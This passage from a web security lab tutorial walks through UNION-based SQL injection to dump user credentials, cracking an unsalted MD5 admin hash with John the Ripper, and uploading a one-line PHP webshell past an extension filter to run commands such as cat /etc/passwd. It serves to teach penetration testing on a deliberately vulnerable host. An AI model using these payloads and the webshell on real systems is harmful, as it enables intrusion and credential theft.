To retrieve this information, we can either

- put tablename and columnname in different parts of the injection: **1 UNION SELECT 1, table_name, column_name,4 FROM information_schema.columns**
- concatenate tablename and columnname in the same part of the injection using the keyword CONCAT: **1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns**. ':' is used to be able to easily split the results of the query.

*If you want to easily retrieve information from the resulting page using a regular expression (if you want to write an SQL injection script for example), you can use a marker in the injection: ``1 UNION SELECT 1,concat('^^^',table_name,':',column_name,'^^^') FROM information_schema.columns``. It then is really easy to match the result in the page.*

You have now a list of tables and their columns, the first tables and columns are the default MySQL tables. At the end of the HTML page, we can see a list of tables that are likely to be used by the current application.

Using this information, you can now build a query to retrieve information from this table:

**1 UNION SELECT 1,concat(login,':',password),3,4 FROM users;**

And get the username and password used to access the administration pages.

*The SQL injection provided the same level of access as the user used by the application to connect to the database (current_user())... That is why it is always important to provide the lowest privileges possible to this user when you deploy a web application.*

### Access to the administration pages and code execution
#### Cracking the password
The password can be easily cracked using 2 different methods:

- A search engine
- John-The-Ripper http://www.openwall.com/john/

When a hash is unsalted, it can be easily cracked using a search engine like google. For that, just search for the hash and you will see a lot of websites with the cleartext version of your password.

John-The-Ripper can be used to crack this password, most modern Linux distribution include a version of John, in order to crack this password you need to tell John what algorithm has been used to encrypted it. For web application, a good guess would be MD5.

In most Linux distributions, the version of John-The-Ripper provided only supports a small number of formats. You can run john without any arguments to get a list of the supported formats from the usage information. For example on Fedora, the following formats are supported:

```sh
$ john
\# ...usage information...
--format=NAME              force hash type NAME: DES/BSDI/MD5/BF/AFS/LM/crypt
\# ...usage information...
```

Unfortunately, the MD5 available is not the format created by the PHP function md5. In order to crack this password, we will need a version of John supporting raw-md5. The community-enhanced version available on the main website supports raw-md5 and can be used.

Now we need to provide the information in the right format for John, we need to put the username and password on the same line separated by a colon ':'.

admin:8efe310f9ab3efeae8d410a8e0166eb2

The following command line can be used to crack the password previously retrieved:

```sh
$ ./john password --format=raw-md5  --wordlist=dico --rules
```
The following options are used:

- **password** tells john what file contains the password hash
- **--format=raw-md5** tells john that the password hash is in the raw-md5 format
- **--wordlist=dico** tells john to use the file dico as a dictionary
- **--rules** tells john to try variations for each word provided

John outputs the number of hashs matching the format used:
```
Loaded 1 password hash (Raw MD5 [SSE2 16x4x2 (intr)])
```
This provides an indication that the correct format is used.

You can retrieve the password really quickly:
```sh
$ ./john password --format=raw-md5  --wordlist=dico --rules
Loaded 1 password hash (Raw MD5 [SSE2 16x4x2 (intr)])
P4ssw0rd         (admin)
```

### Uploading a Webshell and Code Execution
Once access to the administration page is obtained, the next goal is to find a way to execute commands on the operating system.

We can see that there is a file upload function allowing a user to upload a picture, we can use this functionality to try to upload a PHP script. This PHP script once uploaded on the server will give us a way to run PHP code and commands.

First we need to create a PHP script to run commands. Below is the source code of a simple and minimal webshell:

```php
<?php
  system($_GET['cmd']);
?>
```

This script takes the content of the parameter cmd and executes it. It needs to be saved as a file with the extension .php, for example: shell.php can be used as a filename.

We can now use the upload functionality available at the page: http://vulnerable/admin/new.php and try to upload this script.

We can see that the script has not been uploaded correctly on the server. The application prevent file with an extension .php to be uploaded. We can however try:
- **.php3** which will bypass a simple filter on .php
- **.php.test** which will bypass a simple filter on .php and Apache will still use .php since in this configuration it doesn't have an handler for .test

Now, we need to find where the PHP script, managing the upload put the file on the web server. We need to ensure that the file is directly available for web clients. We can visit the web page of the newly uploaded image to see where the **<img>** tag is pointing to:

```html
      <div class="content">
        <h2 class="title">Last picture: Test shell</h2>
        
        <div class="inner" align="center">
          <p>
            <img src="admin/uploads/shell.php3" alt="Test shell" /> </p>
        </div>
     </div>
```

you can now access the page at the following address and start running commands using the cmd parameter. For example, accessing http://vulnerable/admin/uploads/shell.php3?cmd=uname will run the command **uname** on the operating system and return the current kernel (**Linux**).

Other commands can be used to retrieve more information:
- **cat /etc/passwd** to get a full list of the system's users;
- uname -a to get the version of the current kernel;
- ls to get the content of the current directory;
- ...

The webshell has the same privileges as the web server running the PHP script, you won't for example be able to retrieve the content of the file /etc/shadow since the web server doesn't have access to this file (however you should still try in case an administrator made a mistake and changed the permissions on this file).

Each command is run in a brand new context independently of the previous command, you won't be able to get the contents of the /etc/ directory by running cd /etc and ls, **since the second command will be in a new context**. To get the contents of the directory /etc/, you will need to run ls /etc for example.

### Conclusion
This exercise showed you how to manually detect and exploit SQL injection to gain access to the administration pages. Once in the "Trusted zone", more functionality is often available which may lead to more vulnerabilities.

This exercise is based on the results of a penetration test performed on a website few years ago, but websites with these kind of vulnerabilities are still available on Internet today.

The configuration of the web server provided is an ideal case since error messages are displayed and PHP protections are turned off. We will see in another exercise on how SQL injections can be exploited in harder conditions, but in the meantime you can play with the PHP configuration to harden the exercise. To do so you need to enable **magic_quotes_gpc** and disable **display_errors** in the PHP configuration (**/etc/php5/apache2/php.ini**) and restart the web server (**/etc/init.d/apache2 restart**)